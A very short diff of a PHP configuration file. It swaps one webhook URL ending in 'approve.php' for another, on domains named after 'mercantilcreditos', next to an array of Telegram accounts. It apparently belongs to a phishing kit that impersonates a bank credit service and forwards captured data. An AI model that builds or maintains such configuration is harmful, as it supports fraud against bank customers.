@@ -25,5 +25,5 @@ $telegram_accounts = [
 
 ];
 
-$webhook_url = 'https://mercantilcreditosonline.ca-1.instapods.app/approve.php';
+$webhook_url = 'https://mercantilcreditos.cleverapps.io/approve.php';
 ?>
